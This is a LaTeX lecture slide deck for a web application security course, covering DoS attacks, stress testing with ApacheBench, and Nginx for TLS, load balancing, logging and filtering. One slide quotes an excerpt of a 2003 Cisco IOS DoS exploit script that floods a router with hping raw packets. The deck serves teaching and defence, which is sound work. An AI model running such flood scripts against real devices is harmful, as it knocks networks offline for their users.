@@ -1,0 +1,302 @@
+\documentclass[Screen16to9,17pt]{foils}
+\usepackage{zencurity-slides}
+\externaldocument{security-in-web-development-exercises}
+\selectlanguage{english}
+
+\begin{document}
+
+\mytitlepage
+{6. Web Application Security: Offensive and Defensive}
+{Security in Web Development Elective, KEA}
+
+
+\slide{Goals for today}
+
+\hlkimage{6cm}{thomas-galler-hZ3uF1-z2Qc-unsplash.jpg}
+
+Todays goals:
+\begin{list2}
+\item Web Application Hacking -- moving from offensive towards defensive
+\item Talk about a few tools for testing web applications
+\item Start doing defensive -- using Nginx as example TLS endpoint, load balancer and filter
+\end{list2}
+
+Photo by Thomas Galler on Unsplash
+
+
+
+\slide{Plan for today}
+
+\begin{list1}
+\item Subjects
+\begin{list2}
+\item Offense against web application, finish up Denial of Service
+\item The list of offensive methods from the Web Application Security book
+\end{list2}
+\item Exercises
+\begin{list2}
+\item Try using a few web testing tools -- performance / stress testing
+\item Nginx as TLS endpoint
+\item Nginx as Load Balancer
+\item Nginx for logging and filtering
+\end{list2}
+\end{list1}
+
+\slide{Time schedule}
+
+\begin{list2}
+\item 1) Denial of Service and stress testing 45min
+\item 2) Defensive begin: Veracode document 45min
+\item 3) Logging and filtering with Nginx as example 45min
+\item 4) Exercises and workshop 45min
+\end{list2}
+
+Exercises are also mixed in during 1-3
+
+\slide{Reading Summary}
+
+\emph{Web Application Security}, Andrew Hoffman, 2020, ISBN: 9781492053118
+
+\begin{list1}
+\item Part II. Offense, chapters 9-16, very short chapters
+\item 14. Denial of Service (DoS)
+\item 15. Exploiting Third-Party Dependencies
+\item 16. Part II Summary
+\end{list1}
+
+\slide{What we learnt from the offensive part}
+
+%\hlkimage{}{}
+
+\begin{quote}
+{\bf Part II Summary}\\
+
+Ultimately, thoroughly testing a web application will require knowledge of common vulnerability archetypes, critical thinking skills, and domain knowledge so that deep logic vulnerabilities outside of the most common archetypes can be found. The foundational skills presented in Part I and Part II should be sufficient to get you up and running on any web application security pen-testing project you take part in in the future.
+
+{\bf From this point forward, you should pay attention to the business model in any application you test.} All applications are at risk of vulnerabilities like XSS, CSRF, or XXE, but only by gaining a deep understanding of the underlying business model and business logic in an application can you identify more advanced and specific
+vulnerabilities.
+\end{quote}
+Source: \emph{Web Application Security}, Andrew Hoffman, 2020, ISBN: 9781492053118
+
+
+\begin{list2}
+\item Depending on data stored in your application, it may or may not be critical if there is a XSS vulnerability
+\end{list2}
+
+
+\slide{14. Denial of Service (DoS)}
+
+\begin{quote}
+Perhaps one of the most popular types of attacks, and the most widely publicized, is the distributed denial of service (DDoS) attack. This attack is a form of denial of service (DoS), in which a large network of devices flood a server with requests, slowing down the server or rendering it unusable for legitimate users.
+
+DoS attacks come in many forms, from the well-known distributed version that involves thousands or more coordinated devices, to code-level DoS that affects a single user as a result of a faulty regex implementation, resulting in long times to validate a string of text. DoS attacks also range in seriousness from reducing an active server, to a functionless electric bill, to causing a user’s web page to load slightly slower than usual or pausing their video midbuffer.
+
+Because of this, it is very difficult to test for DoS attacks (in particular, the less severe
+ones). Most bug bounty programs outright ban DoS submissions to prevent bounty
+hunters from interfering with regular application usage.
+\end{quote}
+
+\begin{list2}
+\item There has also been some hash-based attacks and attacks using data to create bad performance, see PHP security advisories
+\end{list2}
+
+
+\slide{Riorey Taxonomy of DDoS Attacks }
+
+\begin{list1}
+\item What are DDoS? and DoS?
+\item Denial of Service attack - prevents authorized users access to resources
+\item Can be a single request to HTTP service, sequence of network packets
+\item Distributed Denial of Service attack - many (spoofed) sources
+\item \link{https://en.wikipedia.org/wiki/Denial-of-service_attack}
+\end{list1}
+
+%\slide{ Taxonomy of DDoS Attacks }
+%\slide{}
+\hlkimage{20cm}{riorey-ddos-tcp.png}
+
+\slide{HTTP}
+\hlkimage{20cm}{riorey-ddos-http.png}
+
+NOT a complete list, but examples, see another example\\
+\link{https://en.wikipedia.org/wiki/Slowloris_(computer_security)}
+
+\slide{UDP}
+\hlkimage{20cm}{riorey-ddos-udp.png}
+
+UDP is not used in most Web applications. My advice is to bandwith limit UDP flow into parts of the network with HTTP/HTTPS servers.
+
+\slide{ICMP}
+\hlkimage{20cm}{riorey-ddos-icmp.png}
+
+ICMP is a control protocol for sending messages about a problem. It does not carry data for web applications, so could be restricted and bandwidth limited in most network.
+
+If you have a 10Gigabit connection, having 1Gbit UDP and 100Mbit ICMP is often enough.
+
+\slide{Stress testing: Apache benchmark and others}
+
+\begin{alltt}\footnotesize
+\$ ab -n 100 https://www.kramse.org/
+This is ApacheBench, Version 2.3 <$Revision: 1879490 $>
+Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/
+Licensed to The Apache Software Foundation, http://www.apache.org/
+
+Benchmarking www.kramse.org (be patient).....done
+...
+\end{alltt}
+
+\begin{list1}
+\item Multiple stress testing tools available
+\item Apache Benchmark is old, but easy to run
+\end{list1}
+
+\slide{Apache Benchmark output - 1 }
+
+\begin{alltt}
+\footnotesize
+Server Software:        nginx
+Server Hostname:        www.kramse.org
+Server Port:            443
+SSL/TLS Protocol:       TLSv1.2,ECDHE-RSA-AES256-GCM-SHA384,4096,256
+Server Temp Key:        ECDH P-384 384 bits
+TLS Server Name:        www.kramse.org
+
+Document Path:          /
+Document Length:        5954 bytes
+
+Concurrency Level:      1
+Time taken for tests:   9.596 seconds
+Complete requests:      100
+Failed requests:        0
+Total transferred:      651100 bytes
+HTML transferred:       595400 bytes
+Requests per second:    10.42 [#/sec] (mean)
+Time per request:       95.962 [ms] (mean)
+Time per request:       95.962 [ms] (mean, across all concurrent requests)
+Transfer rate:          66.26 [Kbytes/sec] received
+\end{alltt}
+
+\slide{Apache Benchmark output - 3}
+
+\begin{alltt}
+\footnotesize
+Connection Times (ms)
+              min  mean[+/-sd] median   max
+Connect:       48   71 105.5     61    1114
+Processing:     6   25 157.8      9    1587
+Waiting:        5    9   1.9      9      16
+Total:         55   96 189.0     70    1649
+
+Percentage of the requests served within a certain time (ms)
+  50%     70
+  66%     72
+  75%     73
+  80%     74
+  90%     76
+  95%     78
+  98%   1124
+  99%   1649
+ 100%   1649 (longest request)
+\end{alltt}
+
+\slide{More application testing}
+
+\hlkimage{10cm}{images/linux-tsung-size_rcv.png}
+
+\begin{list1}
+\item Tsung can be used to stress HTTP, WebDAV, SOAP, PostgreSQL, MySQL, LDAP and Jabber/XMPP servers \link{http://tsung.erlang-projects.org/}
+\item Some are targetted towards JSON and REST API testing
+\end{list1}
+
+\exercise{ex:apache-benchmark}
+
+
+\slide{Networks today}
+\hlkimage{16cm}{overview-routing-customer-2015.pdf}
+
+
+\slide{Cisco router DoS \emph{exploit} script}
+
+\begin{alltt}\scriptsize
+#!/bin/sh
+# 2003-07-21 pdonahue cisco-44020.sh
+# -- this shell script is just a wrapper for hping (http://www.hping.org)
+#    with the parameters necessary to fill the input queue on
+# exploitable IOS device
+# -- refer to "Cisco Security Advisory: Cisco IOS Interface Blocked by IPv4 Packets"
+# (http://www.cisco.com/warp/public/707/cisco-sa-20030717-blocked.shtml)
+...
+for protocol in $PROT
+    do
+       $HPING $HOST --rawip $ADDR --ttl $TTL --ipproto $protocol \\
+       --count $NUMB --interval u250 --data $SIZE --file /dev/urandom
+    done
+\end{alltt}
+
+Produced a sequence of packets, that required the router to be powered OFF and ON again to return to normal
+
+I have multiple presentations about network DDoS testing, see my repository\\
+\link{https://github.com/kramse/security-courses/search?q=ddos}
+
+\slide{Defense in depth - multiple layers of security}
+
+\hlkimage{16cm}{network-layers-1.pdf}
+
+
+\exercise{ex:syn-flood}
+
+
+\slide{Veracode slideshow: A short example}
+
+%\hlkimage{}{}
+
+Imagine this:
+\begin{quote}
+You are working as a web developer. You recognize there are security issues in web applications. How would you proceed?
+\end{quote}
+
+You might stumble upon these resources:
+\begin{list2}
+\item \emph{The book Web Application Security} by Andrew Hoffman
+\item The OWASP organisation and web sites, like:\\
+\link{https://cheatsheetseries.owasp.org/cheatsheets/PHP_Configuration_Cheat_Sheet.html}
+\item Misc resources, like \emph{Secure Coding Best Practices Handbook} from Veracode
+\end{list2}
+
+We will now look into this resource, and then return to look at Nginx for Defense
+
+
+\slide{Nginx for defense}
+
+%\hlkimage{}{}
+
+\begin{quote}
+Nginx (pronounced "engine X"[8] /ˌɛndʒɪnˈɛks/ EN-jin-EKS), stylized as NGIИX, is a web server that can also be used as a reverse proxy, load balancer, mail proxy and HTTP cache. The software was created by Igor Sysoev and publicly released in 2004.[9] Nginx is free and open-source software, released under the terms of the 2-clause BSD license. A large fraction of web servers use NGINX,[10] often as a load balancer.[11]
+\end{quote}
+\link{https://en.wikipedia.org/wiki/Nginx}
+
+Nginx is a popular web server, but can also be used for other things. These are enabled when used as a Proxy, reverse proxy in front of services.
+
+\slide{Nginx Use-Cases}
+
+We will now look at a few use-cases, and discuss
+\begin{list2}
+\item Nginx as a Transport Layer Security (TLS) endpoint -- collect ALL your TLS related configuration in one place
+\item Nginx as a Load Balancer
+\item Nginx logging -- look into what is logged normal access and error logging -- run Nikto to produce bad logs
+\item Nginx filtering -- prevent people from accessing a path like \verb+/administration+
+\end{list2}
+
+Feel free to do the exercises in any order, depending on your own interests.
+
+\exercise{ex:nginx-tls}
+
+\exercise{ex:nginx-loadbalancer}
+
+\exercise{ex:nginx-logging}
+
+\exercise{ex:nginx-filtering}
+
+\slidenext{}
+
+\end{document}
